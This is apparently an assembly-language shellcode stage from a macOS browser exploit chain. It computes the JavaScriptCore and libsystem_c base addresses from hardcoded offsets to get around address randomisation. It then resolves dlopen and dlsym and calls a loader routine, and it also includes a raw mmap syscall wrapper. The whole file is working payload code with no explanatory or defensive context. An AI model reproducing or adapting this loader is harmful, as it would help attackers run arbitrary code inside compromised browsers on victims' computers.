.intel_syntax noprefix
.globl _dlopen_ptr
.globl _dlsym_ptr

lea rcx, [rbp+0x10]
mov rax, [rbp+0x8]
mov rdi, [rax+0x10]

mov rax, [rsp] // return address
sub rax, 0x0000000000361f13
mov r9, rax  // [scratch] r9 = JavaScriptCore.__TEXT.__text

mov rax, r9
add rax, [rip+JSC_confstr_stub_offset]
xor rbx, rbx
mov ebx, [rax + 2]
add rax, rbx
add rax, 6
mov rax, [rax]
sub rax, [rip+libsystem_c_confstr_offset]
mov r10, rax // [scratch] r10 = libsystem_c base

mov rax, r10
add rax, [rip+libsystem_c_dlopen_stub_offset]
mov rsi, rax

mov rax, r10
add rax, [rip+libsystem_c_dlsym_stub_offset]
mov rdx, rax

call _main
ret

_main:
    push rbp
    mov rbp, rsp
    push r14
    push r15
    and rsp, ~0xf

    mov [rip+_dlopen_ptr], rsi
    mov [rip+_dlsym_ptr], rdx

    // rdi == library base pointer (mach-o header)
    // rsi == argv
    mov rsi, rcx
    call _load

    lea rsp, [rbp - 0x10]
    pop r15
    pop r14
    pop rbp
    ret

_mmap:
    push    rbp
    mov     rbp, rsp
    push    r15
    push    r14
    push    r12
    push    rbx
    mov eax, 0x20000C5
    mov r10, rcx
    syscall
    pop     rbx
    pop     r12
    pop     r14
    pop     r15
    pop     rbp
    ret

_dlopen_ptr: .quad 0
_dlsym_ptr: .quad 0

JSC_confstr_stub_offset: .quad 0xE7D8B4
libsystem_c_confstr_offset: .quad 0x0000000000002644
libsystem_c_dlopen_stub_offset: .quad 0x80430
libsystem_c_dlsym_stub_offset: .quad 0x80436
